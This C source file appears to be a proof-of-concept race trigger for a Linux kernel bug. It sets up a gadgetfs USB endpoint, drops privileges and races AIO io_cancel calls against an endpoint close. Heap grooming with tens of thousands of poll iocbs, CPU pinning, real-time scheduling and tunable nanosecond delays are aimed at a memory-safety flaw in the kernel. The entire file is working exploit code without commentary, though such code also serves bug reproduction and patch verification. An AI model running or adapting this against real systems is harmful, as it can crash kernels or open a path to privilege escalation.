#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/aio_abi.h>
#include <linux/usb/ch9.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <time.h>
#include <unistd.h>

#ifndef IOCB_CMD_POLL
#define IOCB_CMD_POLL 5
#endif

#define EP0_PATH "/dev/gadget/dummy_udc"
#define EP_PATH "/dev/gadget/ep1in-bulk"
#define LEN 65
#define MAX_POLLERS 65536

struct ep7 { uint8_t bLength, bDescriptorType, bEndpointAddress, bmAttributes; uint16_t wMaxPacketSize; uint8_t bInterval; } __attribute__((packed));
struct desc_blob { uint32_t tag; struct usb_config_descriptor cfg; struct usb_interface_descriptor intf; struct ep7 ep_out; struct ep7 ep_in; struct usb_device_descriptor dev; } __attribute__((packed));
struct ep_msg { uint32_t tag; struct ep7 ep; } __attribute__((packed));

static aio_context_t ctx;
static struct iocb target_cb;
static struct iocb decoy_cb;
static struct iocb poll_cbs[MAX_POLLERS];
static int shared_pipe[2] = { -1, -1 };
static int pollers = 32768;
static atomic_int go;
static atomic_ulong target_zero, target_err, decoy_zero, decoy_err, poll_zero, poll_err;
static atomic_int target_last_errno, decoy_last_errno;
static int ep0_global = -1;
static long poll_delay_ns = 0;
static long target_delay_ns = 2000;
static int target_burst = 1;
static int poll_burst = 1;
static long close_after_go_ns = 1000;
static int cancel_pollers = 0;

static long xio_setup(unsigned nr, aio_context_t *c) { return syscall(SYS_io_setup, nr, c); }
static long xio_destroy(aio_context_t c) { return syscall(SYS_io_destroy, c); }
static long xio_submit(aio_context_t c, long nr, struct iocb **iocbpp) { return syscall(SYS_io_submit, c, nr, iocbpp); }
static long xio_cancel(aio_context_t c, struct iocb *iocb, struct io_event *evt) { return syscall(SYS_io_cancel, c, iocb, evt); }
static long xio_getevents(aio_context_t c, long min, long nr, struct io_event *ev, struct timespec *to) { return syscall(SYS_io_getevents, c, min, nr, ev, to); }

static void nsleep(long ns) { if (ns <= 0) return; struct timespec ts = { ns / 1000000000L, ns % 1000000000L }; while (nanosleep(&ts, &ts) && errno == EINTR) {} }
static void pin_cpu(int cpu) { cpu_set_t s; CPU_ZERO(&s); CPU_SET(cpu, &s); sched_setaffinity(0, sizeof(s), &s); }
static void busy_delay(long ns) { struct timespec a,b; if (ns <= 0) return; clock_gettime(CLOCK_MONOTONIC_RAW,&a); for (;;) { clock_gettime(CLOCK_MONOTONIC_RAW,&b); long d=(b.tv_sec-a.tv_sec)*1000000000L+(b.tv_nsec-a.tv_nsec); if (d>=ns) break; } }

static int write_device_desc(int fd) {
  struct desc_blob d; memset(&d, 0, sizeof(d));
  d.cfg.bLength = USB_DT_CONFIG_SIZE; d.cfg.bDescriptorType = USB_DT_CONFIG;
  d.cfg.wTotalLength = USB_DT_CONFIG_SIZE + USB_DT_INTERFACE_SIZE + 2 * sizeof(struct ep7);
  d.cfg.bNumInterfaces = 1; d.cfg.bConfigurationValue = 1; d.cfg.bmAttributes = USB_CONFIG_ATT_ONE; d.cfg.bMaxPower = 1;
  d.intf.bLength = USB_DT_INTERFACE_SIZE; d.intf.bDescriptorType = USB_DT_INTERFACE; d.intf.bInterfaceNumber = 0; d.intf.bNumEndpoints = 2; d.intf.bInterfaceClass = 0xff;
  d.ep_out.bLength = sizeof(struct ep7); d.ep_out.bDescriptorType = USB_DT_ENDPOINT; d.ep_out.bEndpointAddress = 0x01; d.ep_out.bmAttributes = USB_ENDPOINT_XFER_BULK; d.ep_out.wMaxPacketSize = 64;
  d.ep_in.bLength = sizeof(struct ep7); d.ep_in.bDescriptorType = USB_DT_ENDPOINT; d.ep_in.bEndpointAddress = 0x81; d.ep_in.bmAttributes = USB_ENDPOINT_XFER_BULK; d.ep_in.wMaxPacketSize = 64;
  d.dev.bLength = USB_DT_DEVICE_SIZE; d.dev.bDescriptorType = USB_DT_DEVICE; d.dev.bcdUSB = 0x0200; d.dev.bDeviceClass = USB_CLASS_VENDOR_SPEC; d.dev.bMaxPacketSize0 = 64; d.dev.idVendor = 0x1d6b; d.dev.idProduct = 0x0104; d.dev.bcdDevice = 1; d.dev.bNumConfigurations = 1;
  ssize_t n = write(fd, &d, sizeof(d));
  if (n != (ssize_t)sizeof(d)) { fprintf(stderr, "dev_desc write=%zd errno=%d\n", n, errno); return -1; }
  return 0;
}

static void prep_ep_perms(void) {
  for (int i = 0; i < 200; i++) {
    if (access(EP_PATH, F_OK) == 0) { chown(EP_PATH, 1000, 1000); chmod(EP_PATH, 0666); return; }
    nsleep(5000000L);
  }
}

static int enable_in_ep(int fd) {
  struct ep_msg m; memset(&m, 0, sizeof(m));
  m.tag = 1; m.ep.bLength = sizeof(struct ep7); m.ep.bDescriptorType = USB_DT_ENDPOINT; m.ep.bEndpointAddress = 0x81; m.ep.bmAttributes = USB_ENDPOINT_XFER_BULK; m.ep.wMaxPacketSize = 64;
  ssize_t n = write(fd, &m, sizeof(m));
  if (n != (ssize_t)sizeof(m)) { fprintf(stderr, "ep_desc write=%zd errno=%d\n", n, errno); return -1; }
  return 0;
}

static void *target_cancel_thread(void *arg) {
  (void)arg; pin_cpu(2);
  struct sched_param sp; memset(&sp, 0, sizeof(sp));
  sp.sched_priority = 1;
  sched_setscheduler(0, SCHED_FIFO, &sp);
  while (!atomic_load_explicit(&go, memory_order_acquire)) {}
  busy_delay(target_delay_ns);
  for (int i = 0; i < target_burst; i++) {
    struct io_event ev; memset(&ev, 0, sizeof(ev));
    long r = xio_cancel(ctx, &target_cb, &ev);
    if (r == 0) atomic_fetch_add(&target_zero, 1); else { atomic_fetch_add(&target_err, 1); atomic_store(&target_last_errno, errno); }
    if ((i & 7) == 7) nsleep(500);
  }
  return NULL;
}


static void *decoy_cancel_thread(void *arg) {
  (void)arg; pin_cpu(0);
  struct sched_param sp; memset(&sp, 0, sizeof(sp));
  sp.sched_priority = 1;
  sched_setscheduler(0, SCHED_FIFO, &sp);
  while (!atomic_load_explicit(&go, memory_order_acquire)) {}
  busy_delay(poll_delay_ns);
  struct io_event ev; memset(&ev, 0, sizeof(ev));
  long r = xio_cancel(ctx, &decoy_cb, &ev);
  if (r == 0) atomic_fetch_add(&decoy_zero, 1); else { atomic_fetch_add(&decoy_err, 1); atomic_store(&decoy_last_errno, errno); }
  return NULL;
}

static void *close_thread(void *arg) {
  (void)arg; pin_cpu(1);
  while (!atomic_load_explicit(&go, memory_order_acquire)) {}
  busy_delay(close_after_go_ns);
  if (ep0_global >= 0) close(ep0_global);
  return NULL;
}

struct poll_arg { int idx; };
static void *poll_cancel_thread(void *arg) {
  struct poll_arg *pa = arg; pin_cpu(0);
  while (!atomic_load_explicit(&go, memory_order_acquire)) {}
  busy_delay(poll_delay_ns + (pa->idx & 7) * 250);
  for (int i = 0; i < poll_burst; i++) {
    struct io_event ev; memset(&ev, 0, sizeof(ev));
    long r = xio_cancel(ctx, &poll_cbs[pa->idx], &ev);
    if (r == 0) atomic_fetch_add(&poll_zero, 1); else atomic_fetch_add(&poll_err, 1);
  }
  return NULL;
}

static int submit_poll_fillers(void) {
  static struct iocb *list[MAX_POLLERS];
  if (pipe2(shared_pipe, O_NONBLOCK | O_CLOEXEC)) { perror("pipe2 shared"); return -1; }
  for (int i = 0; i < pollers; i++) {
    memset(&poll_cbs[i], 0, sizeof(poll_cbs[i]));
    poll_cbs[i].aio_data = 0xabc000 + i;
    poll_cbs[i].aio_fildes = shared_pipe[0];
    poll_cbs[i].aio_lio_opcode = IOCB_CMD_POLL;
    poll_cbs[i].aio_buf = POLLIN;
    list[i] = &poll_cbs[i];
  }
  long s = xio_submit(ctx, pollers, list);
  fprintf(stderr, "samefd_poll_submit=%ld errno=%d pollers=%d pipefd=%d\n", s, errno, pollers, shared_pipe[0]);
  return s == pollers ? 0 : -1;
}

int main(int argc, char **argv) {
  if (argc > 1) target_delay_ns = atol(argv[1]);
  if (argc > 2) poll_delay_ns = atol(argv[2]);
  if (argc > 3) pollers = atoi(argv[3]);
  if (argc > 4) target_burst = atoi(argv[4]);
  if (argc > 5) close_after_go_ns = atol(argv[5]);
  if (argc > 6) cancel_pollers = atoi(argv[6]);
  struct rlimit nf = {65535, 65535}; setrlimit(RLIMIT_NOFILE, &nf);
  struct rlimit rt = {1, 1}; setrlimit(RLIMIT_RTPRIO, &rt);
  if (pollers < 0) pollers = 0; if (pollers > MAX_POLLERS) pollers = MAX_POLLERS;
  pin_cpu(1);
  mkdir("/dev/gadget", 0755); mount("gadgetfs", "/dev/gadget", "gadgetfs", 0, NULL);
  int ep0 = open(EP0_PATH, O_RDWR | O_CLOEXEC); if (ep0 < 0) { perror("open ep0"); return 1; } ep0_global = ep0;
  if (write_device_desc(ep0)) return 2;
  nsleep(1000000000L); prep_ep_perms();
  if (setgid(1000) || setuid(1000)) { perror("drop uid"); return 20; }
  fprintf(stderr, "uid=%d target_delay=%ld decoy_delay=%ld samefd_pollers=%d target_burst=%d close_after=%ld\n", getuid(), target_delay_ns, poll_delay_ns, pollers, target_burst, close_after_go_ns);
  int epfd = open(EP_PATH, O_RDWR | O_CLOEXEC); if (epfd < 0) { perror("open ep"); return 3; }
  if (enable_in_ep(epfd)) return 4;
  unsigned aio_nr = (unsigned)(pollers + 32); if (aio_nr < 1024) aio_nr = 1024;
  fprintf(stderr, "io_setup_nr=%u\n", aio_nr);
  if (xio_setup(aio_nr, &ctx) < 0) { perror("io_setup"); return 5; }

  if (pollers && submit_poll_fillers()) return 7;

  unsigned char *buf = aligned_alloc(64, LEN); memset(buf, 'Z', LEN);
  memset(&target_cb, 0, sizeof(target_cb));
  target_cb.aio_data = (uint64_t)(uintptr_t)&target_cb; target_cb.aio_fildes = epfd; target_cb.aio_lio_opcode = IOCB_CMD_PWRITE; target_cb.aio_buf = (uint64_t)(uintptr_t)buf; target_cb.aio_nbytes = LEN;
  fprintf(stderr, "target_user_iocb=%p\n", (void *)&target_cb);
  struct iocb *one[1] = { &target_cb };
  long s = xio_submit(ctx, 1, one); fprintf(stderr, "target_submit=%ld errno=%d\n", s, errno); if (s != 1) return 6;

  memset(&decoy_cb, 0, sizeof(decoy_cb));
  decoy_cb.aio_data = 0xdec0; decoy_cb.aio_fildes = shared_pipe[0]; decoy_cb.aio_lio_opcode = IOCB_CMD_POLL; decoy_cb.aio_buf = POLLIN;
  fprintf(stderr, "decoy_user_iocb=%p\n", (void *)&decoy_cb);
  struct iocb *decoy_one[1] = { &decoy_cb };
  long ds = xio_submit(ctx, 1, decoy_one); fprintf(stderr, "decoy_submit=%ld errno=%d\n", ds, errno); if (ds != 1) return 8;

  pthread_t ttarget, tdecoy, tclose; pthread_t tpoll[MAX_POLLERS]; struct poll_arg pargs[MAX_POLLERS];
  atomic_store(&go, 0); atomic_store(&target_zero, 0); atomic_store(&target_err, 0); atomic_store(&decoy_zero, 0); atomic_store(&decoy_err, 0); atomic_store(&poll_zero, 0); atomic_store(&poll_err, 0); atomic_store(&target_last_errno, 0); atomic_store(&decoy_last_errno, 0);
  pthread_create(&tdecoy, NULL, decoy_cancel_thread, NULL);
  pthread_create(&ttarget, NULL, target_cancel_thread, NULL);
  pthread_create(&tclose, NULL, close_thread, NULL);
  for (int i = 0; i < (cancel_pollers ? pollers : 0); i++) { pargs[i].idx = i; pthread_create(&tpoll[i], NULL, poll_cancel_thread, &pargs[i]); }
  nsleep(100000);
  atomic_store_explicit(&go, 1, memory_order_release);

  struct io_event ev[256]; memset(ev, 0, sizeof(ev)); struct timespec to = {1, 0};
  long gr = xio_getevents(ctx, 0, 256, ev, &to);
  pthread_join(tdecoy, NULL); pthread_join(ttarget, NULL); pthread_join(tclose, NULL); for (int i = 0; i < (cancel_pollers ? pollers : 0); i++) pthread_join(tpoll[i], NULL);
  fprintf(stderr, "getevents=%ld target_zero=%lu target_err=%lu target_last_errno=%d decoy_zero=%lu decoy_err=%lu decoy_last_errno=%d poll_zero=%lu poll_err=%lu\n", gr, atomic_load(&target_zero), atomic_load(&target_err), atomic_load(&target_last_errno), atomic_load(&decoy_zero), atomic_load(&decoy_err), atomic_load(&decoy_last_errno), atomic_load(&poll_zero), atomic_load(&poll_err));
  close(epfd); xio_destroy(ctx); return 0;
}
